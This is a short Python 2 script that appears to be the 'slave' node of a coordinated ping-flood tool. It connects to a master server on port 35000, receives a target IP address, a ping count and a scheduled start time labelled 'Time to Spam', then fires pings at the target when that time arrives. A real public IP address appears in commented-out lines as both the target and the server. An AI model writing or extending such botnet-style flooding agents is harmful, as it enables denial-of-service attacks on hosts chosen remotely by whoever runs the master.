#!/usr/bin/python
import socket
import sys
import datetime
import time
from slaveping import Ping
#from slavepunch import Punch

my_address = socket.gethostbyname(socket.gethostname())

slave = 'slave'
global ipAdd
global numPing
#ipAdd = '198.252.11.72'
ipAdd = 'localhost'
numPing = 5
global ping_time_str

#datetime.datetime(curr_time.year, curr_time.month, curr_time.day,curr_time.hour, curr_time.minute)
#datetime.timedelta(x,x) #where x,x is desired time (day,hour,minute,second,etc)
#Create a TCP/IP socket
soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#Connect the socket to the port where the server is listening
#server_address = ('198.252.11.72', 35000)
#server_address = (my_address, 35000)
server_address = ('localhost', 35000)
print >>sys.stderr, 'Connecting To: %s => Port: %s' % server_address
soc.connect(server_address)

try:
	#send data
	message = 'Client Hostname: ' + socket.gethostname() + '\n' + 'slave'
	print >>sys.stderr, '\nSending: "%s"' % message
	soc.sendall(slave)
		
	while True:
		ipAdd = soc.recv(1024)
		numPing = soc.recv(1024)
		ping_time_str = soc.recv(1024)
		print >>sys.stderr, 'New IP Address: ', ipAdd
		print >>sys.stderr, 'Number of Pings: ', numPing
		print >>sys.stderr, 'Time to Spam: ', ping_time_str
		break
	
finally:
	print >>sys.stderr, '\nClosing Socket'
	soc.close()
	count = int(numPing)
	while True:
		curr_time = datetime.datetime.now()
		ping_time_time = datetime.datetime(*map(int,ping_time_str.split('-')))
		if curr_time > ping_time_time:
			Ping(ipAdd, count)
			print >>sys.stderr, 'Complete'
			break
